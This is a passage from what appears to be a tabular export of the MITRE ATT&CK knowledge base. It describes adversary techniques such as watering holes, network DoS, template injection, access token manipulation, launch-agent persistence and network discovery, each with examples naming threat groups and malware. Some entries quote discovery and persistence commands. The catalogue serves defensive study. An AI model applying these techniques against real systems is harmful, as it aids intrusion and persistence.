'[KARAE] was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.', '[Earth Lusca] has performed watering hole attacks.', '[APT38] has conducted watering holes schemes to gain initial access to victims.', '[Bundlore] has been spread through malicious advertisements on websites.', '[Axiom] has used watering hole attacks to gain access.', '[APT19] performed a watering hole attack on forbes.com in 2014 to compromise targets.', '[Darkhotel] used embedded iframes on hotel login portals to redirect selected victims to download malware.', '[Andariel] has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range.', '[APT28] has compromised targets via strategic web compromise utilizing custom exploit kits. [APT28] used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages.', '[Dragonfly] has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.', '[Bad Rabbit] spread through watering holes on popular sites by injecting JavaScript into the HTML body or a <code>.js</code> file.', '[Dark Caracal] leveraged a watering hole to serve up malicious code.', '[Turla] has infected victims using watering holes.', '[Patchwork] has used watering holes to deliver files with exploits to initial victims.', '[Leviathan] has infected victims using watering holes.', '[APT32] has infected victims by tricking them into visiting compromised watering hole websites.', '[BRONZE BUTLER] compromised three Japanese websites using a Flash exploit to perform watering hole attacks.', 'During [Operation Dust Storm] the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322.', '[Lazarus Group] delivered [RATANKBA] and other malicious code to victims via a compromised legitimate website.', '[Threat Group-3390] has extensively used strategic web compromises to target victims.', 'During [C0010] UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.', '[LoudMiner] is typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.', '[SocGholish] has been distributed through compromised websites with malicious content often masquerading as browser updates.', '[Elderwood] has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.', '[REvil] has infected victim machines through compromised websites and exploit kits.', '[Mustard Tempest] has used drive-by downloads for initial infection, often using fake browser updates as a lure.', ""[APT37] has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly."", '[Leafminer] has infected victims using watering holes.', '[Grandoreiro] has used compromised websites and Google Ads to bait victims into downloading its installer.', '[Machete] has distributed [Machete] through a fake blog website.', '[Snip3] has been delivered to targets via downloads from malicious domains.', '[PROMETHIUM] has used watering hole attacks to deliver malicious versions of legitimate installers.', '[POORAIM] has been delivered through compromised sites acting as watering holes.', '[Windigo] has distributed Windows malware via drive-by downloads.', '[Magic Hound] has conducted watering-hole attacks through media and magazine websites.', ""[Dragonfly 2.0] compromised legitimate organizations' websites to create watering holes to compromise victims.""]",False
T1498,Network Denial of Service,"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.  A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).  To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.  Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.  For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]","['In 2016, [APT28] conducted a distributed denial of service (DDoS) attack against the World Anti-Doping Agency.', '[NKAbuse] enables multiple types of network denial of service capabilities across several protocols post-installation.', '[Lucifer] can execute TCP, UDP,  and HTTP denial of service (DoS) attacks.']",
T1651,Cloud Administration Command,"Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents.   If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a [Trusted Relationship] to execute commands in connected virtual machines.","['[APT29] has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines.', '[AADInternals] can execute commands on Azure virtual machines using the VM agent.', '[Pacu] can run commands on EC2 instances using AWS Systems Manager Run Command.']",False
T1158,Hidden Files and Directories,"To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).  Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.  ### Windows  Users can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.  ### Linux/Mac  Users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name   . Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.  ### Mac  Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.",[],True
T1221,Template Injection,"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.  Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.  Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as [Phishing] and/or [Taint Shared Content] and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.  Adversaries may also modify the <code>*\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.  This technique may also enable [Forced Authentication] by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.","['[Dragonfly] has injected SMB URLs into malicious Word spearphishing attachments to initiate [Forced Authentication]', '[Confucius] has used a weaponized Microsoft Word document with an embedded RTF exploit.', 'During [Operation Dream Job] [Lazarus Group] used DOCX files to retrieve a malicious document template/DOTM file.', '[Tropic Trooper] delivered malicious documents with the XLSX extension, typically used by OpenXML documents, but the file itself was actually an OLE (XLS) document.', '[APT28] used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. ', 'During [Frankenstein] the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.', '[Gamaredon Group] has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads. [Gamaredon Group] can also inject malicious macros or remote templates into documents already present on compromised systems.', '[Chaes] changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload. ', '[Inception] has used decoy documents to load malicious remote payloads via HTTP.', '[WarzoneRAT] has been install via template injection through a malicious DLL embedded within a template RTF in a Word document.', '[DarkHydrus] used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable [Forced Authentication]', '[Lazarus Group] has used DOCX files to retrieve a malicious document template/DOTM file.', '[Frankenstein] has used trojanized documents that retrieve remote templates from an adversary-controlled website.', '[Dragonfly 2.0] has injected SMB URLs into malicious Word spearphishing attachments to initiate [Forced Authentication]']",
T1134,Access Token Manipulation,"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.  An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft] or used to spawn a new process (i.e. [Create Process with Token] An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.  Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.","['[HermeticWiper] can use `AdjustTokenPrivileges` to grant itself privileges for debugging with `SeDebugPrivilege`, creating backups with `SeBackupPrivilege`, loading drivers with `SeLoadDriverPrivilege`, and shutting down a local system with `SeShutdownPrivilege`.', '[SUNSPOT] modified its security token to grants itself debugging privileges by adding <code>SeDebugPrivilege</code>.', '[PowerSploit] <code>Invoke-TokenManipulation</code> Exfiltration module can be used to manipulate tokens.', '[AppleSeed] can gain system level privilege by passing <code>SeDebugPrivilege</code> to the <code>AdjustTokenPrivilege</code> API.', '[Sliver] has the ability to manipulate user tokens on targeted Windows systems.', '[FIN6] has used has used Metasploit’s named-pipe impersonation technique to escalate privileges.', '[Blue Mockingbird] has used JuicyPotato to abuse the <code>SeImpersonate</code> token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.', '[SslMM] contains a feature to manipulate process privileges and tokens.', '[Duqu] examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.', '[Empire] can use [PowerSploit] <code>Invoke-TokenManipulation</code> to manipulate access tokens.', '[Gelsemium] can use token manipulation to bypass UAC on Windows7 systems.', '[Cuba] has used <code>SeDebugPrivilege</code> and <code>AdjustTokenPrivileges</code> to elevate privileges.', '[Mafalda] can use `AdjustTokenPrivileges()` to elevate privileges.', 'During [C0017] [APT41] used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local `NT AUTHORITY\\SYSTEM` privilege escalation.', '[PoshC2] can use Invoke-TokenManipulation for manipulating tokens.', '[Hydraq] creates a backdoor through which remote attackers can adjust token privileges.', '[KillDisk] has attempted to get the access token of a process by calling <code>OpenProcessToken</code>. If [KillDisk] gets the access token, then it attempt to modify the token privileges with <code>AdjustTokenPrivileges</code>.', '[Ryuk] has attempted to adjust its token privileges to have the <code>SeDebugPrivilege</code>.', '[MegaCortex] can enable <code>SeDebugPrivilege</code> and adjust token privileges.', '[BlackCat] has the ability modify access tokens.']",False
T1209,Time Providers,"The Windows Time service (W32Time) enables time synchronization across and within domains.  W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.   Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\</code>.  The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.   Adversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. ",[],True
T1111,Multi-Factor Authentication Interception,"Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms.   If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token.   Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes).   Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users’ phones.","['[SLOWPULSE] can log credentials on compromised Pulse Secure VPNs during the `DSAuth::AceAuthServer::checkUsernamePassword`ACE-2FA authentication procedure.', '[Sykipot] is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.', 'During [Operation Wocao] threat actors used a custom collection method to intercept two-factor authentication soft tokens.', '[Kimsuky] has used a proprietary tool to intercept one time passwords required for two-factor authentication.', '[Chimera] has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.', '[LAPSUS$] has replayed stolen session token and passwords to trigger simple-approval MFA prompts in hope of the legitimate user will grant necessary approval.', '[Operation Wocao] has used a custom collection method to intercept two-factor authentication soft tokens.']",False
T1159,Launch Agent,"Per Apple’s developer documentation, when a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (plist) files found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>$HOME/Library/LaunchAgents</code>   . These launch agents have property list files which point to the executables that will be launched .   Adversaries may install a new launch agent that can be configured to execute at login by using launchd or launchctl to load a plist into the appropriate directories    . The agent name may be disguised by using a name from a related operating system or benign software. Launch Agents are created with user level privileges and are executed with the privileges of the user when they log in  . They can be set up to execute when a specific user logs in (in the specific user’s directory structure) or when any user logs in (which requires administrator privileges).","['[Dok] persists via a Launch Agent.', '[CrossRAT] creates a Launch Agent on macOS.', '[Calisto] adds a .plist file to the <code>/Library/LaunchAgents</code> folder to maintain persistence.', 'The [Komplex] trojan creates a persistent launch agent called with <code>$HOME/Library/LaunchAgents/com.apple.updates.plist</code> with <code>launchctl load -w ~/Library/LaunchAgents/com.apple.updates.plist</code>.', '[MacSpy] persists via a Launch Agent.', '[CoinTicker] creates user launch agents named .espl.plist and com.apple.[random string].plist to establish persistence.', '[OSX_OCEANLOTUS.D] can create a persistence file in the folder <code>/Library/LaunchAgents</code>.', '[FruitFly] persists via a Launch Agent.', '[Keydnap] uses a Launch Agent to persist.', '[Proton] persists via a Launch Agent.']",True
T1136,Create Account,"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.  Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.","['[Indrik Spider] used <code>wmic.exe</code> to add a new user to the system.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] added a login to a SQL Server with `sp_addlinkedsrvlogin`.', '[Scattered Spider] creates new user identities within the compromised organization.', '[Sandworm Team] added a login to a SQL Server with <code>sp_addlinkedsrvlogin</code>.', 'Dragonfly created accounts that appeared to be tailored to each individual staging target.']",False
T1526,Cloud Service Discovery,"An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.  Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.  For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.  Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools] or [Disable or Modify Cloud Logs]","['[AADInternals] can enumerate information about a variety of cloud services, such as Office 365 and Sharepoint instances or OpenID Configurations.', '[ROADTools] can enumerate Azure AD applications and service principals.\t', '[Pacu] can enumerate AWS services, such as CloudTrail and CloudWatch.']",False
T1151,Space after Filename,"Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to ""evil.txt "" (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed .   Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.",['[Keydnap] puts a space after a false .jpg extension so that execution actually goes through the Terminal.app program.'],True
T1018,Remote System Discovery,"Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  [Ping] or <code>net view</code> using [Net]  Adversaries may also analyze data from local host files (ex: <code>C:\Windows\System32\Drivers\etc\hosts</code> or <code>/etc/hosts</code>) or other passive means (such as local [Arp] cache entries) in order to discover the presence of remote systems in an environment.  Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI] commands on network devices to gather detailed information about systems within a network (e.g. <code>show cdp neighbors</code>, <code>show arp</code>).   ","['[menuPass] uses scripts to enumerate IP ranges on the victim network. [menuPass] has also issued the command <code>net view /domain</code> to a [PlugX] implant to gather information about remote systems on the network.', '[MURKYTOP] has the capability to identify remote hosts on connected networks.', 'The [TAINTEDSCRIBE] command and execution module can perform target system enumeration.', '[ROADTools] can enumerate Azure AD systems and devices.', '[BitPaymer] can use <code>net view</code> to discover remote systems.', '[QakBot] can identify remote systems through the <code>net view</code> command.', 'During [Operation CuckooBees] the threat actors used the `net view` and `ping` commands as part of their advanced reconnaissance.', 'During [Operation Wocao] threat actors used `nbtscan` and `ping` to discover remote systems, as well as `dsquery subnet` on a domain controller to retrieve all subnets in the Active Directory.', '[Fox Kitten] has used Angry IP Scanner to detect remote systems.', '[USBferry] can use <code>net view</code> to gather information about remote systems.', '[Bazar] can enumerate remote systems using <code> Net View</code>.', '[BADHATCH] can use a PowerShell object such as, `System.Net.NetworkInformation.Ping` to ping a computer.', '[BlackCat] can broadcasts NetBIOS Name Service (NBNC) messages to search for servers connected to compromised networks.', '[Naikon] has used a netbios scanner for remote machine identification.', '[Deep Panda] has used ping to identify other machines of interest.', '[Earth Lusca] used the command <code>powershell “Get-EventLog -LogName security -Newest 500 | where {$_.EventID -eq 4624} | format-list - property * | findstr “Address””</code> to find the network information of successfully logged-in accounts to discovery addresses of other machines. [Earth Lusca] has also used multiple scanning tools to discover other machines within the same compromised network.', 'Commands such as <code>net view</code> can be used in [Net] to gather information about available remote systems.', '[Black Basta] can use LDAP queries to connect to AD and iterate over connected workstations.', '[yty] uses the <code>net view</code> command for discovery.', ""During [FunnyDream] the threat actors used several tools and batch files to map victims' internal networks."", '[FIN5] has used the open source tool Essential NetTools to map the network and build a list of targets.', '[Volt Typhoon] has used multiple methods, including [Ping] to enumerate systems on compromised networks.', '[Sandworm Team] has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD. ', '[njRAT] can identify remote hosts on connected networks.', '[Industroyer] can enumerate remote computers in the compromised network.', '[Remsec] can ping or traceroute a remote host.', '[Akira] uses software such as Advanced IP Scanner and MASSCAN to identify remote hosts within victim networks.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] remotely discovered systems over LAN connections. OT systems were visible from the IT network   as well, giving adversaries the ability to discover operational assets. ', '[Ke3chang] has used network scanning and enumeration tools, including [Ping]', '[CrackMapExec] can discover active IP addresses, along with the machine name, within a targeted network.', '[PoetRAT] used Nmap for remote system discovery.', '[HEXANE] has used `net view` to enumerate domain machines.', '[Epic] uses the <code>net view</code> command on the victim’s machine.', '[Kwampirs] collects a list of available servers with the command <code>net view</code>.', '[FunnyDream] can collect information about hosts on the victim network.', 'During the [SolarWinds Compromise] [APT29] used [AdFind] to enumerate remote systems.', '[Comnie] runs the <code>net view</code> command', '[WannaCry] scans its local network segment for remote systems to try to exploit and copy itself to.', '[Threat Group-3390] has used the <code>net view</code> command.', '[Sykipot] may use <code>net view /domain</code> to display hostnames of available systems on a network.', '[Cobalt Strike] uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.', '[SILENTTRINITY] can enumerate and collect the properties of domain computers.', '[BloodHound] can enumerate and collect the properties of domain computers, including domain controllers.', '[DRATzarus] can search for other machines connected to compromised host and attempt to map the network.', '[OSInfo] performs a connection test to discover remote systems in the network', '[Flagpro] has been used to execute <code>net view</code> on a targeted system. ', '[ToddyCat] has used `ping %REMOTE_HOST%` for post exploit discovery.', '[HermeticWizard] can find machines on the local network by gathering known local IP addresses through `DNSGetCacheDataTable`, `GetIpNetTable`,`WNetOpenEnumW(RESOURCE_GLOBALNET, RESOURCETYPE_ANY)`,`NetServerEnum`,`GetTcpTable`, and `GetAdaptersAddresses.`', '[BRONZE BUTLER] typically use <code>ping</code> and [Net] to enumerate systems.', '[APT39] has used [NBTscan] and custom tools to discover remote systems.', '[Ping] can be used to identify remote systems within a network.', ' [Conti] has the ability to discover hosts on a target network.', '[RATANKBA] runs the <code>net view /domain</code> and <code>net view</code> commands.', '[SHOTPUT] has a command to list all servers in the domain, as well as one to locate domain controllers on a domain.', '[APT32] has enumerated DC servers using the command <code>net group ""Domain Controllers"" /domain</code>. The group has also used the <code>ping</code> command.', '[Silence] has used Nmap to scan the corporate network, build a network topology, and identify vulnerable hosts.\t', '[Carbon] uses the <code>net view</code> command.', '[Kinsing] has used a script to parse files like <code>/etc/hosts</code> and SSH <code>known_hosts</code> to discover remote systems.', ""[FIN6] used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS."", '[Diavol] can use the ARP table to find remote hosts to scan. ', '[TrickBot] can enumerate computers and network devices.', '[Indrik Spider] has used PowerView to enumerate all Windows Server, Windows Server 2003, and Windows 7 instances in the Active Directory database.', '[SpicyOmelette] can identify payment systems, payment gateways, and ATM systems in compromised environments.', '[Turla] surveys a system upon check-in to discover remote systems on a local network using the <code>net view</code> and <code>net view /DOMAIN</code> commands. [Turla] has also used <code>net group ""Domain Computers"" /domain</code>, <code>net group ""Domain Controllers"" /domain</code>, and <code>net group ""Exchange Servers"" /domain</code> to enumerate domain computers, including the organization\'s DC and Exchange Server.', ""[Arp] can be used to display a host's ARP cache, which may include address resolutions for remote systems."", '[NBTscan] can list NetBIOS computer names.\t', '[Rocke] has looked for IP addresses in the known_hosts file on the infected system and attempted to SSH into them.\t', '[Leafminer] used Microsoft’s Sysinternals tools to gather detailed information about remote systems.', '[Olympic Destroyer] uses [Windows Management Instrumentation] to enumerate all systems in the network.', '[Magic Hound] has used [Ping] for discovery on targeted networks.', '[Nltest] may be used to enumerate remote domain controllers using options such as <code>/dclist</code> and <code>/dsgetdc</code>.', '[Scattered Spider] can enumerate remote systems, such as VMware vCenter infrastructure.', '[Chimera] has utilized various scans and queries to find domain controllers and remote services in the target environment.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD.', '[HAFNIUM] has enumerated domain controllers using `net group ""Domain computers""` and `nltest /dclist`.', '[Wizard Spider] has used networkdll for network discovery and psfin specifically for financial and point of sale indicators. [Wizard Spider] has also used [AdFind] <code>nltest/dclist</code>, and PowerShell script Get-DataInfo.ps1 to enumerate domain computers, including the domain controller.', '[AdFind] has the ability to query Active Directory for computers.', ""[Shamoon] scans the C-class subnet of the IPs on the victim's interfaces."", '[APT3] has a tool that can detect the existence of remote systems.', ""During [C0015] the threat actors used the commands `net view /all /domain` and `ping` to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration."", '[GALLIUM] used a modified version of [NBTscan] to identify available NetBIOS name servers over the network as well as <code>ping</code> to identify remote systems.', '[FIN8] has used [dsquery] and other Active Directory utilities to enumerate hosts; they have also used <code>nltest.exe /dclist</code> to retrieve a list of domain controllers.', '[Backdoor.Oldrea] can enumerate and map ICS-specific systems in victim environments.', '[Dragonfly] has likely obtained a list of hosts in the victim environment.', '[TRITON] TsLow python module pings controllers over the TriStation protocol. ', '[UNC2452] used [AdFind] to enumerate remote systems.', '[APT29] has used [AdFind] to enumerate remote systems.', '[Operation Wocao] can use the <code>ping</code> command to discover remote systems.', '[Dragonfly 2.0] likely obtained a list of hosts in the victim environment.', '[Cobalt Strike] uses the native Windows Network Enumeration APIs to interrogate and discover targets in a Windows Active Directory network.']",False
T1046,Network Service Discovery,"Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system.     Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.  Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.","['[Pupy] has a built-in module for port scanning.', '[APT39] has used [CrackMapExec] and a custom port scanner known as BLUETORCH for network scanning.', 'During [CostaRicto] the threat actors employed nmap and pscan to scan target environments. ', '[BlackTech] has used the SNScan tool to find other potential targets on victim networks.', '[menuPass] has used tcping.exe, similar to [Ping] to probe port status on systems of interest.', '[Backdoor.Oldrea] can use a network scanning module to identify ICS-related ports.', '[Threat Group-3390] actors use the Hunter tool to conduct network service discovery for vulnerable systems.', '[Industroyer] uses a custom port scanner to map out a network.', '[Empire] can perform port scans from an infected host.', '[FIN13] has utilized `nmap` for reconnaissance efforts. [FIN13] has also scanned for internal MS-SQL servers in a compromised network.', '[Ramsay] can scan for systems that are vulnerable to the EternalBlue exploit.\t', '[DarkVishnya] performed port scanning to obtain the list of active services.', '[OilRig] has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.', '[Lazarus Group] has used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network.', '[Leafminer] scanned network services to search for vulnerabilities in the victim system.', '[Royal] can scan the network interfaces of targeted systems.', '[SpeakUp] checks for availability of specific ports on servers.', '[BlackEnergy] has conducted port scans on a host.', '[Hildegard] has used masscan to look for kubelets in the internal Kubernetes network.', '[Tropic Trooper] used <code>pr</code> and an openly available tool to scan for open ports on target systems.', '[Naikon] has used the LadonGo scanner to scan target networks.', '[Magic Hound] has used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning.', '[Rocke] conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers.', 'During [C0027] used RustScan to scan for open ports on targeted ESXi appliances.', '[NBTscan] can be used to scan IP networks.', '[APT32] performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities.', '[Peirates] can initiate a port scan against a given IP address.', '[BADHATCH] can check for open ports on a computer by establishing a TCP connection.', '[ZxShell] can launch port scans. ', '[Koadic] can scan for open TCP ports on the target network.', '[China Chopper] server component can spider authentication portals.', 'During [C0018] the threat actors used the SoftPerfect Network Scanner for network scanning.', '[Chimera] has used the <code>get -b <start ip> -e <end ip> -p</code> command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP.', '[SILENTTRINITY] can scan for open ports on a compromised machine.', '[APT41] used a malware variant called WIDETONE to conduct port scans on specified subnets.', '[Xbash] can perform port scanning of TCP and UDP ports.', '[Cobalt Strike] can perform port scans from an infected host.', ""[Suckfly] the victim's internal network for hosts with ports 8080, 5900, and 40 open."", '[Brute Ratel C4] can conduct port scanning against targeted systems.', '[P.A.S. Webshell] can scan networks for open ports and listening services.', '[XTunnel] is capable of probing the network for open ports.', '[HermeticWizard] has the ability to scan ports on a compromised network.', ""[FIN6] used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS."", '[TeamTNT] has used masscan to search for open Docker API ports and Kubernetes clusters. [TeamTNT] has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments.', 'During [Operation Wocao] threat actors scanned for open ports and used nbtscan to find NETBIOS nameservers.', '[BackdoorDiplomacy] has used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware.', '[Conficker] scans for other machines to infect.', '[HDoor] scans to identify open ports on the victim.', '[MURKYTOP] has the capability to scan for open ports on hosts in a connected network.', '[Fox Kitten] has used tools including NMAP to conduct broad scanning to identify open ports.', '[InvisiMole] can scan the network for open ports and vulnerable instances of RDP and SMB protocols.', '[PoshC2] can perform port scans from an infected host.', '[Remsec] has a plugin that can perform ARP scanning as well as port scanning.', '[Lucifer] can scan for open ports including TCP ports 135 and 1433.', 